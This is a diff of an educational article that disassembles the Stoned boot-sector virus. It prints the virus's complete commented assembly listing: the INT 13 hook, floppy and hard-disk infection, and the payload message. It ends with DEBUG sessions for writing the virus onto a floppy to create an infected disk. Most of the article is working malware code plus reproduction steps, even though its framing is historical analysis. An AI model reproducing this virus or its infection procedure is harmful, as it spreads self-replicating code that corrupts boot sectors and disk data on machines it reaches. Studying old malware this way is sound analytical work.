@@ -1,5 +1,10 @@
-%%title = Stoned Bootsector Virus
-%%image = Stoned.jpg
+![Stoned](Stoned.jpg)
+
+>>> deploy:<br>
+>>>  Journal.md<br>
+>>>  +Stoned.jpg<br>
+
+# Stoned Computer Virus
 
 A condensed and nicely edited version of this material can be found in my article [A Look at Computer Viruses in Circuit Cellar magazine March 2003](http://www.cc-webshop.com/Circuit-Cellar-Issue-152-March-2003-PDF-FI-2003-152.htm).
 
@@ -100,13 +105,13 @@ takes the CPU beyond a small media descriptor table that describes the disk's co
 signature jump statement, the ROM executes it by setting the CS register to 0000 and the IP to 7C00. Here is the code from the ROM of my old 286 machine. It performs 
 the transfer from ROM to the operating system.
 
-{{{
+```
 ; ROM BIOS BOOTSTRAP
 ; This is where control is transferred to the loaded bootsector
 ...
 F000:F80B EA007C000000        JMP        0000:7C00
 ...
-}}}
+```
 
 Bootsector programs have to be small; they have to fit in a 512 byte floppy-disk sector. The DOS bootsector simply loads the two hidden system files IO.SYS and 
 MSDOS.SYS. MSDOS.SYS contains the DOS interrupt, INT 21. This is a massive interrupt handler with lots of subcommands selected by passing arguments through the 
@@ -169,7 +174,7 @@ The virus will eventually move itself around in memory and copy itself to disk. 
 action is to re-align the CS register so that the virus is at the beginning of segment 07C0. The far jump at location 0000 does nothing more than jump to the very next 
 instruction changing the CS and IP registers along the way. The second instruction is a short (relative) jump over the Infector code and some storage to the Loader at 00A1.
 
-{{{
+```
 ; STONED PC COMPUTER VIRUS 
 ; (BOOTSECTOR INFECTOR)
 ;
@@ -178,14 +183,14 @@ instruction changing the CS and IP registers along the way. The second instructi
 ;                                                       ; loaded. Jump to next instruction.               
 ;                                                       ; (Re-orient the CS along the way)
 ;
-0005: E9 99 00          JMP     $00A1                   ;{} *2 Jump over data area
+0005: E9 99 00          JMP     $00A1                   ; *2 Jump over data area
 ;
 0008: 00                ; Media source. 0 if loaded from a floppy, 2 from a fixed disk.
 ;     Offs Seg
 0009: 00 00 00 00       ; Original INT 13 vector
 000D: E4 00 00 00       ; Resident virus location in memory      (used for easy JMP)
 0011: 00 7C 00 00       ; Pointer to original boot sector memory (used for easy JMP)
-}}}
+```
 
 Anytime you find two absolute jumps together in a control flow a red flag should get raised. Why jump from location 0000 to location 0005 and then from location 
 0005 to 00A1? Why not just jump from 0000 directly to 00A1? The extra jump instruction wastes three bytes of memory. On this dig we are going to identify several 
@@ -205,7 +210,7 @@ reference to the original bootsector when the virus has loaded. Neither of these
 
 ## The Infector 
 
-{{{
+```
 ;-----------------------------------------------------------------
 ; Infector
 ;-----------------------------------------------------------------
@@ -213,11 +218,11 @@ reference to the original bootsector when the virus has loaded. Neither of these
 0015: 1E                PUSH    DS                      ; Hold ...
 0016: 50                PUSH    AX                      ; ... incoming parameters
 0017: 80 FC 02          CMP     AH,$02                  ; Is this a READ SECTOR request?
-001A: 72 17             JB      $0033                   ;{} Ingore all requests ...
+001A: 72 17             JB      $0033                   ; Ignore all requests ...
 001C: 80 FC 04          CMP     AH,$04                  ; ... except ...
-001F: 73 12             JNB     $0033                   ;{} ... READ = 2 or WRITE = 3 ...
+001F: 73 12             JNB     $0033                   ; ... READ = 2 or WRITE = 3 ...
 0021: 0A D2             OR      DL,DL                   ; ... to drive 0 ...
-0023: 75 0E             JNZ     $0033                   ;{} ... (floppy)
+0023: 75 0E             JNZ     $0033                   ; ... (floppy)
 0025: 33 C0             XOR     AX,AX                   ; Set the DS register ...
 0027: 8E D8             MOV     DS,AX                   ; ... to 0000
 ; The first sector in a group written to disk starts the drive motor. This check is a way
@@ -225,12 +230,12 @@ reference to the original bootsector when the virus has loaded. Neither of these
 ; on every sector which would bring the disk access to a crawl.
 0029: A0 3F 04          MOV     AL,[DS:$043F]           ; Check to see if drive motor is ...
 002C: A8 01             TEST    AL,$01                  ; ... already turned on.
-002E: 75 03             JNZ     $0033                   ;{} Yes ... don't do anything
-0030: E8 07 00          CALL    $003A                   ;{} Do any viral infection
-0033: 58                POP     AX                      ;{*} Restore original ...
+002E: 75 03             JNZ     $0033                   ; Yes ... don't do anything
+0030: E8 07 00          CALL    $003A                   ; Do any viral infection
+0033: 58                POP     AX                      ; Restore original ...
 0034: 1F                POP     DS                      ; ... incoming parameters
 0035: 2E FF 2E 09 00    JMP     FAR [CS:$0009]          ; Execute the original INT 13
-}}}
+```
 
 At this point, the Loader has long since finished its work; the virus is safe in the upper area of conventional memory. The virus has been "hooked into" INT 13 by 
 remembering the original vector in its data-area and changing the INT vector to point to 0015. Location 0015 is then called by some poor, unsuspecting program needing 
@@ -247,17 +252,17 @@ gets the motor going, and the motor continues to run while the remaining data is
 last sector is accessed.) By watching the motor, the virus only takes effect on the first sector in a stream of sectors. Otherwise, the user would notice a terrible 
 drop in performance for disk access. Again, this check is quite clever.
 
-{{{
+```
 ; Try to infect Drive A
 ;
-003A: 53                PUSH    BX                      ;{*} Save all ...
+003A: 53                PUSH    BX                      ; Save all ...
 003B: 51                PUSH    CX                      ; ...
 003C: 52                PUSH    DX                      ; ...
 003D: 06                PUSH    ES                      ; ...
 003E: 56                PUSH    SI                      ; ...
 003F: 57                PUSH    DI                      ; ... registers
-0040: BE 04 00          MOV     SI,$0004                ; 4 attemps at reading (motor warm up)
-0043: B8 01 02          MOV     AX,$0201                ;{*} Read one sector
+0040: BE 04 00          MOV     SI,$0004                ; 4 attempts at reading (motor warm up)
+0043: B8 01 02          MOV     AX,$0201                ; Read one sector
 0046: 0E                PUSH    CS                      ; Set ES to point ...
 0047: 07                POP     ES                      ; ... to code segment
 0048: BB 00 02          MOV     BX,$0200                ; Just past the virus in memory
@@ -265,24 +270,24 @@ drop in performance for disk access. Again, this check is quite clever.
 004D: 89 CA             MOV     DX,CX                   ; Head 0, Drive 0
 004F: 41                INC     CX                      ; Now Cyl 1
 0050: 9C                PUSHF                           ; *4 Set stack as if an interrupt
-}}}
+```
 
 The infection process first preserves all the incoming parameters and sets up a call to the original INT13 to load the bootsector of the floppy into memory 
 just after the virus. Note the PUSHF instruction at 0050. The original INT13 is an interrupt handler, and its last instruction is an RETI -- RETurn from Interrupt. 
 Since the virus will be CALLing the routine, it must push the flags onto the stack to simulate an INT. Otherwise, too much information is popped off the stack 
 with the RETI, and the CPU crashes.
 
-{{{
+```
 0051: 2E FF 1E 09 00    CALL    FAR [CS:$0009]          ; Read boot sector with INT 13
-0056: 73 0E             JNB     $0066                   ;{} Got it ... move on.
+0056: 73 0E             JNB     $0066                   ; Got it ... move on.
 0058: 33 C0             XOR     AX,AX                   ; Reset drive command
 005A: 9C                PUSHF                           ; Set stack as if an interrupt
 005B: 2E FF 1E 09 00    CALL    FAR [CS:$0009]          ; Reset drive with INT 13
 0060: 4E                DEC     SI                      ; All attempts tried?
-0061: 75 E0             JNZ     $0043                   ;{} No ... keep trying
-0063: EB 35             JMP     $009A                   ;{} Couldn't do it ... out
+0061: 75 E0             JNZ     $0043                   ; No ... keep trying
+0063: EB 35             JMP     $009A                   ; Couldn't do it ... out
 0065: 90                NOP                             ; Assembler fill
-}}}
+```
 
 The NOP instruction at 0065 is confusing at first glance. The jump at 0056 jumps over the NOP to location 0066, and no other jump in the code brings the CPU 
 back to location 0065. This is simply a wasted byte with no other function than to take up space. Why would a programmer, already limited to a sector's worth 
@@ -321,29 +326,29 @@ eliminate the wasted NOPs.
 Searching the code for forward jumps reveals only two: this one and the one at the one at 0105. Closing up these wasted bytes frees two more bytes of memory -- 
 five so far.
 
-{{{
+```
 ; At this point the drive is responding - load the boot sector into virus memory segment
 ; and check if it has been infected.
-0066: 33 F6             XOR     SI,SI                   ;{*} Virus starting point
+0066: 33 F6             XOR     SI,SI                   ; Virus starting point
 0068: BF 00 02          MOV     DI,$0200                ; Just read boot sector
 006B: FC                CLD                             ; Moving forward
 006C: 0E                PUSH    CS                      ; Set DS to ...
 006D: 1F                POP     DS                      ; ... code segment
 006E: AD                LODSW                           ; First word of virus
 006F: 3B 05             CMP     AX,[DI]                 ; Looks the same as boot sector?
-0071: 75 06             JNZ     $0079                   ;{} No ... we need to infect
+0071: 75 06             JNZ     $0079                   ; No ... we need to infect
 0073: AD                LODSW                           ; Compare second words to be sure
 0074: 3B 45 02          CMP     AX,[DI+$02]             ; Looks the same?
-0077: 74 21             JZ      $009A                   ;{} Yes ... already infected
+0077: 74 21             JZ      $009A                   ; Yes ... already infected
 ;
 ; Boot sector is not infected - move original into FAT table and write virus to boot sector.
-0079: B8 01 03          MOV     AX,$0301                ;{*} Write one sector
+0079: B8 01 03          MOV     AX,$0301                ; Write one sector
 007C: BB 00 02          MOV     BX,$0200                ; Point to original boot
 007F: B1 03             MOV     CL,$03                  ; *5 Cyl 0, Sec 3
 0081: B6 01             MOV     DH,$01                  ; Head 1, Drive 0
 0083: 9C                PUSHF                           ; Set stack as if an interrupt
 0084: 2E FF 1E 09 00    CALL    [CS:$0009]              ; Hold original boot sector
-0089: 72 0F             JB      $009A                   ;{} Error ... out of here
+0089: 72 0F             JB      $009A                   ; Error ... out of here
 008B: B8 01 03          MOV     AX,$0301                ; Write one sector
 008E: 33 DB             XOR     BX,BX                   ; At offset 0
 0090: B1 01             MOV     CL,$01                  ; Sector 1
@@ -352,14 +357,14 @@ five so far.
 0095: 2E FF 1E 09 00    CALL    FAR [CS:$0009]          ; Write virus to normal boot entry
 ;
 ; Restore original parameters to INT 13 request and do original INT 13.
-009A: 5F                POP     DI                      ;{*} Restore all ...
+009A: 5F                POP     DI                      ; Restore all ...
 009B: 5E                POP     SI                      ; ...
 009C: 07                POP     ES                      ; ...
 009D: 5A                POP     DX                      ; ...
 009E: 59                POP     CX                      ; ...
 009F: 5B                POP     BX                      ; ... Registers
 00A0: C3                RET                             ; Done
-}}}
+```
 
 The rest of the Infector code is straightforward. The current bootsector is loaded from the floppy into memory. If the first four bytes of the sector match the 
 virus, the sector must already be infected and the virus leaves it alone. Otherwise, the original sector is written to a holding place on the floppy (cylinder 0, 
@@ -375,12 +380,12 @@ root directory, the same kind of corruption will occur.
 
 ## The Loader 
 
-{{{
+```
 ;-----------------------------------------------------------------
 ; Loader
 ;-----------------------------------------------------------------
 ; Executes on bootup
-00A1: 33 C0             XOR     AX,AX                   ;{*} Set DS to ...
+00A1: 33 C0             XOR     AX,AX                   ; Set DS to ...
 00A3: 8E D8             MOV     DS,AX                   ; ... system segment
 00A5: FA                CLI                             ; No interrupts through here
 00A6: 8E D0             MOV     SS,AX                   ; Set a temporary ...
@@ -407,10 +412,10 @@ root directory, the same kind of corruption will occur.
 00D8: 33 F6             XOR     SI,SI                   ; Offsets are both ...
 00DA: 8B FE             MOV     DI,SI                   ; ... zero
 00DC: FC                CLD                             ; Moving forward
-00DD: F3 A4             REPZ    MOVSB                   ; Move virus into top of memroy
+00DD: F3 A4             REPZ    MOVSB                   ; Move virus into top of memory
 00DF: 2E FF 2E 0D 00    JMP     FAR [CS:$000D]          ; Continue with next instruction in
                                                         ; new segment.
-}}}
+```
 
 Now we come to 00A1 -- the destination of the jumps in the first few bytes of the program. Remember that the computer is booting up at this point, and the virus 
 has just been loaded into memory at 0000:7C00. The CS register has been re-oriented so that this instruction is executed at 07C0:00A1. First the virus suspends 
@@ -420,7 +425,7 @@ The ROM bootstrap writes the amount of RAM (number of 1K chunks) as a byte to lo
 two 1K-chunks from the memory pool by subtracting 2 from this location. The virus then calculates the segment address of the reserved area and copies its entire 
 length from 0000:7C00 to the permanent location.
 
-Why 2K? The virus is only ½K in length -- it just fits in the 512-byte bootsector of a floppy, and it needs only ½K to live in. However, the virus must check 
+Why 2K? The virus is only 1/2K in length -- it just fits in the 512-byte bootsector of a floppy, and it needs only 1/2K to live in. However, the virus must check 
 (by loading) the bootsectors of disks into memory. Since the virus checks the fixed disk (as we will see), the read buffer must be 1K long; the virus is expecting 
 fixed disks to use 1K sectors. Memory is reserved in 1K chunks, and the virus sets aside 2K to fill its 1.5K needs.
 
@@ -438,7 +443,7 @@ The segment value RRRR is not know until run time, but the MOV at location 00CF 
 Then when the CPU gets to the instruction a few cycles later, it will know exactly where to go! This is called "self-modifying" code since the program actually writes 
 its own instructions as it executes. Changing the JMP eliminates the four bytes of data at 000D. That brings our savings up to 9 bytes.
 
-{{{
+```
 ; At this point virus is running in its new 2K home at the end of RAM.
 00E4: B8 00 00          MOV     AX,$0000                ; Reset disk system (prepare for IO)
 00E7: CD 13             INT     $13                     ; Disk now ready
@@ -447,13 +452,13 @@ its own instructions as it executes. Changing the JMP eliminates the four bytes 
 00ED: B8 01 02          MOV     AX,$0201                ; Read 1 sector
 00F0: BB 00 7C          MOV     BX,$7C00                ; Read location = normal boot buffer
 00F3: 2E803E0800 00     CMP     BYTE PTR [CS:$0008],$00 ; *7 Are we booting from a hard-disk?
-00F9: 74 0B             JZ      $0106                   ;{} No ... use floppy hold sector
+00F9: 74 0B             JZ      $0106                   ; No ... use floppy hold sector
 00FB: B9 07 00          MOV     CX,$0007                ; Cyl 0, Sec 7
 00FE: BA 80 00          MOV     DX,$0080                ; Head 0, Drive 80
 0101: CD 13             INT     $13                     ; Read original boot from storage
-0103: EB 49             JMP     $014E                   ;{} Continue with normal boot
+0103: EB 49             JMP     $014E                   ; Continue with normal boot
 0105: 90                NOP                             ; Assembler fill
-}}}
+```
 
 Once the virus has relocated, the parameters are set for loading the original bootsector into memory, but the virus has to find where it put the original 
 bootsector. As we saw, this location is different depending on the type of disk. If the computer is booting from a fixed-disk, the virus simply loads the 
@@ -466,15 +471,15 @@ Notice the instruction at 00E4. AX is used to pass information into the INT13; A
 MOVs to load parameters into registers for INT calls is second nature to 8x86 programmers, and we generally find immediate MOVs before any INTx instruction. 
 However, at 00E4 the programmer could have saved a byte by doing an "XOR AX,AX" (which results in 0000). That brings our code savings up to 10 bytes.
 
-{{{
+```
 ; We are booting up from a floppy - have a look at any local fixed-disks.
-0106: B9 03 00          MOV     CX,$0003                ;{*} Cyl 0, Sec 3 
+0106: B9 03 00          MOV     CX,$0003                ; Cyl 0, Sec 3 
 0109: BA 00 01          MOV     DX,$0100                ; Head 1, Drive 0
 010C: CD 13             INT     $13                     ; Load the original boot sector
-010E: 72 3E             JB      $014E                   ;{} Error -- nothing we can do!
+010E: 72 3E             JB      $014E                   ; Error -- nothing we can do!
 0110: 26F6066C0407      TEST    BYTE PTR [ES:$046C],$07 ; *8 Low byte of timer (random)
-0116: 75 12             JNZ     $012A                   ;{} Skip over 7/8 of the time
-}}}
+0116: 75 12             JNZ     $012A                   ; Skip over 7/8 of the time
+```
 
 At 0106, the virus loads the original bootsector from the floppy. The conditional jump at 010E checks for any access errors, but this is really just a waste 
 of space. If the original bootsector can't be loaded, the system will not come up no matter what the virus does. The jump transfers execution to 0000:7C00, 
@@ -490,39 +495,39 @@ times a second, and the clock-handler routine increments the word at 0000:046C. 
 essentially a random number. The test at 0116 will fall through to the next section of code if the lower three bits of the timer are all 0's. If you boot your 
 PC from an infected floppy, you will see the famous "Your PC is now stoned!" message on average of once every eight boot-ups.
 
-{{{
+```
 ; 1 out of every 8 infected hard drives will see this message at the boot up where
 ; they are infected.
 0118: BE 89 01          MOV     SI,$0189                ; Message
 011B: 0E                PUSH    CS                      ; Set DS ...
 011C: 1F                POP     DS                      ; ... to virus segment
-011D: AC                LODSB                           ;{*} Get byte in message
+011D: AC                LODSB                           ; Get byte in message
 011E: 0A C0             OR      AL,AL                   ; Last loaded?
-0120: 74 08             JZ      $012A                   ;{} Yes ... done with message
+0120: 74 08             JZ      $012A                   ; Yes ... done with message
 0122: B4 0E             MOV     AH,$0E                  ; Teletype mode
 0124: B7 00             MOV     BH,$00                  ; Base of screen
 0126: CD 10             INT     $10                     ; Print character
-0128: EB F3             JMP     $011D                   ;{} Do all characters
+0128: EB F3             JMP     $011D                   ; Do all characters
 ;
-012A: 0E                PUSH    CS                      ;{*} Set ES ...
+012A: 0E                PUSH    CS                      ; Set ES ...
 012B: 07                POP     ES                      ; ... to CS
 012C: B8 01 02          MOV     AX,$0201                ; Read current boot from C:
 012F: BB 00 02          MOV     BX,$0200                ; Buffer after virus
 0132: B1 01             MOV     CL,$01                  ; Cyl = 0 (still), Sec = 1
 0134: BA 80 00          MOV     DX,$0080                ; Head = 0, Drive = 80
 0137: CD 13             INT     $13                     ; Read current boot sector
-0139: 72 13             JB      $014E                   ;{} Error ... skip it
+0139: 72 13             JB      $014E                   ; Error ... skip it
 013B: 0E                PUSH    CS                      ; Set DS ...
 013C: 1F                POP     DS                      ; ... to CS
 013D: BE 00 02          MOV     SI,$0200                ; Current boot sector data
 0140: BF 00 00          MOV     DI,$0000                ; Virus data
 0143: AD                LODSW                           ; Get first word of boot sector
 0144: 3B 05             CMP     AX,[DI]                 ; Same as virus?
-0146: 75 11             JNZ     $0159                   ;{} No ... infect it
+0146: 75 11             JNZ     $0159                   ; No ... infect it
 0148: AD                LODSW                           ; Yes ... try second word
 0149: 3B 45 02          CMP     AX,[DI+$02]             ; Boot sector looks like virus?
-014C: 75 0B             JNZ     $0159                   ;{} No ... infect it
-}}}
+014C: 75 0B             JNZ     $0159                   ; No ... infect it
+```
 
 Once the message is printed (or skipped), the virus continues at 012A. Here the virus attempts to load the bootsector from a fixed-disk. If an error occurs, 
 the virus continues with the normal boot up process. This time the error checking is needed since the error is likely -- it could mean that there is no fixed-disk 
@@ -531,12 +536,12 @@ in the computer. Ah, those were the days!
 If the first four bytes of the loaded bootsector match the virus, the disk is already infected and the original bootsector is executed with the following section of 
 code. Otherwise, the hard-disk infection continues at 0159.
 
-{{{
+```
 ; No matter how virus loaded, it infects only floppy disks that get a copy of the
 ; memory-resident copy of the virus. We want floppies to have media type = 0.
-014E: 2E C6 06 08 00 00 MOV     BYTE PTR [CS:$0008],$00 ;{*} Media type = floppy.
+014E: 2E C6 06 08 00 00 MOV     BYTE PTR [CS:$0008],$00 ; Media type = floppy.
 0154: 2E FF 2E 11 00    JMP     [CS:$0011]              ; Continue with normal boot sector
-}}}
+```
 
 This is how the virus finishes its loading by executing the original bootsector, which was loaded from disk earlier. Once again an indirect jump is used where a 
 direct, intrasegment jump is better. The direct jump occupies the same space (five bytes) and executes a little faster. Replacing the five bytes at 0154 with a 
@@ -546,15 +551,15 @@ The very last thing the virus does before turning control over to the original b
 booted. Once it is loaded into memory, the virus only infects floppies. To infect a floppy, the virus copies the entire memory-resident virus to the bootsector 
 of the disk -- the media-type flag is set to zero for once and for all.
 
-{{{
+```
 ; Infect hard-drive
-0159: 2E C6 06 08 00 02 MOV     BYTE PTR [CS:$0008],$02 ;{*} Store virus on C: with flag set
+0159: 2E C6 06 08 00 02 MOV     BYTE PTR [CS:$0008],$02 ; Store virus on C: with flag set
 015F: B8 01 03          MOV     AX,$0301                ; Write 1 sector
 0162: BB 00 02          MOV     BX,$0200                ; Original boot sector
 0165: B9 07 00          MOV     CX,$0007                ; Cyl = 0, Sec = 7
 0168: BA 80 00          MOV     DX,$0080                ; Head = 0, Drive = 80
 016B: CD 13             INT     $13                     ; Store original boot in FAT
-016D: 72 DF             JB      $014E                   ;{} Error ... out of here
+016D: 72 DF             JB      $014E                   ; Error ... out of here
 ;
 ; Floppies are assumed to have 512 byte sectors (0200 hex) which is just barely
 ; room for the virus. Fixed disks are assumed to have twice that - 1K sectors (0400).
@@ -574,7 +579,7 @@ of the disk -- the media-type flag is set to zero for once and for all.
 0181: 33 DB             XOR     BX,BX                   ; Offset 0
 0183: FE C1             INC     CL                      ; Cyl = 0, Sec = 1
 0185: CD 13             INT     $13                     ; Write infected boot sector
-0187: EB C5             JMP     $014E                   ;{} Continue with normal boot sector
+0187: EB C5             JMP     $014E                   ; Continue with normal boot sector
 ;
 ; Stoned Message
 ; $07,'Your PC is now STONED!',$07,$0d,$0a,$0a,$00
@@ -597,7 +602,7 @@ of the disk -- the media-type flag is set to zero for once and for all.
 01AC: 45 20 4D 41           
 01B0: 52 49 4A             
 01B3: 55 41 4E 41 21
-}}}
+```
       
 As the above code shows, infecting a fixed-disk's bootsector is slightly more complicated. In general, fixed-disks have 1K sectors (twice as large as 
 the sectors on a floppy). The first half of the sector contains a normal bootsector program, but the last half contains a special data-area that describes 
@@ -635,7 +640,7 @@ virus on a 3.5" disk.
 The virus copies the original bootsector to cylinder 0, sector 3, head 1 of the floppy. You can do this with DEBUG (a standard command-prompt utility shipped 
 with all PC operating systems). Using the assembler built into DEBUG, you can copy the bootsector to the expected holding place as shown with the DEBUG session below:
 
-{{{
+```
 >debug
 - L 200 0 0 1
 - A
@@ -648,7 +653,7 @@ with all PC operating systems). Using the assembler built into DEBUG, you can co
 <enter>
 - G
 - Q
-}}}
+```
 
 The 'L' command loads the bootsector into the current segment at offset 200. Next, you use the 'A' command to assemble a small program fragment. The assembler 
 will assemble your program at offset 0100 by default. (This is a throw-back to the days when COM files were common. COM files have one segment and load just 
@@ -665,11 +670,11 @@ you can punch in the virus from the listing in about 40 minutes.
 The DEBUG session below shows how to load the virus from a binary file named A:\STONED.BIN into the current segment at offset 0100. We can then use the DEBUG 'W' 
 command to write the virus into the bootsector of drive 0 (the floppy).
 
-{{{
+```
 >debug a:\stoned.bin
 - W 100 0 0 1
 - Q
-}}}
+```
 
 Congratulations! You now have a floppy infected with the Stoned virus. I booted from the floppy on an old 286 machine I keep around the house for just 
 such experiments. (It is almost an archeological find in itself). After several boots, I got the signature Stoned message, and I used DEBUG to look at the 
